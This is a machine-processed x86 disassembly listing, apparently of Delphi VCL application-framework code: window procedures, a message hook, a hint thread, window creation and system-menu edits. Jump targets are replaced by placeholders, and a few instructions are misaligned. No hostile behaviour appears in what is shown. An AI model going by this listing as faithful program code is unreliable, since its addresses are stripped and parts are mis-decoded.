mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_41a468
mov dl [ ebp - 0x1 ]
call sub_460994
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_460288
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41a30c
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_41a4e4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_41a468
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_460934
test al al
je r-xdata
inc esi
sub_460c90
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_46029c
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_460288
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_460ce8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_460c90
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_460d62
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_460b44
pop ecx
push ebp
mov al 0x2
call sub_460b44
pop ecx
push ebp
mov al 0x3
call sub_460b44
pop ecx
push ebp
mov al 0x4
call sub_460b44
pop ecx
push ebp
mov al 0x5
call sub_460b44
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403234
retn
sub_460d70
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_460904
xor eax eax
push ebp
push sub_460de9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_460ce8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_46090c
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_460e04
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_404008
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_40405c
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_460e5c
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_460e8d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_463350
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_460eb0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_441430
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_4633cc
sub_460f0c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_462454
sub_460f50
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_460f0c
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_460eb0
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_460fc4
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_461020
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_461050
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_461078
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_461020
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_461050
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_461050
sub_4610b8
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420714
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403558
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_462838
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a5c4
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_42a994
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_462fd0
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c84c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_462a30
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c874
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_4089d0
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_404278
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_4631ac
mov eax ebx
call sub_463bc0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_4613c0
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_4612a1
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_4035c0
mov ebx edx
mov esi eax
mov eax esi
call sub_463bd0
mov [ esp + 0x4 ] esi
mov [ esp ] sub_462838
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_462a30
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_4633cc
xor edx edx
mov eax esi
call sub_462d48
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420760
push esi
push sub_4617f4
mov eax esi
call sub_462624
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405a38
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_403234
mov eax [ esi + 0x90 ]
call sub_403234
mov eax [ esi + 0x98 ]
call sub_403234
test bl bl
jle r-xdata
call sub_421850
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_4613c0
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_461561
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461568
lea eax [ ebp - 0x2c ]
call sub_404008
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_461940
call sub_4217b8
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_4044c8
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406e74
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_404008
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_462044
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_462044
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_461570
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_4602a4
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_4615d0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_41a30c
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_4493d8
cmp ebx eax
je r-xdata
sub_461640
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_4615d0
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_41a468
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_461758
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_41a468
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_4617f4
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40cb14
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_4607b0
mov eax [ rw-data ]
call sub_460df8
sub_46184c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4618a9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4618b0
lea eax [ ebp - 0x4 ]
call sub_404008
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_404200
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_4618b8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_4618f4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_462044
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_461940
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_461ffa
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4617f4
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_462b08
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_41a468
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_4493d8
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_463a84
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_462624
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_4625c8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_4493d8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_462044
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_460df8
push ebp
call sub_4618b8
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_4618b8
pop ecx
jmp [ eax * 4 + jump_table_4619e4 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_4493d8
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_462488
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_44dd30
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46184c
push ebp
call sub_4618b8
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_4618b8
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_4618b8
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_420090
jmp r-xdata
xor eax eax
call sub_459778
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_4493d8
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_443d6c
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_462060
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_4618b8
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_45eff8
jmp r-xdata
push ebp
call sub_4618b8
pop ecx
jmp r-xdata
push ebp
call sub_4618f4
pop ecx
jmp r-xdata
push ebp
call sub_4618b8
pop ecx
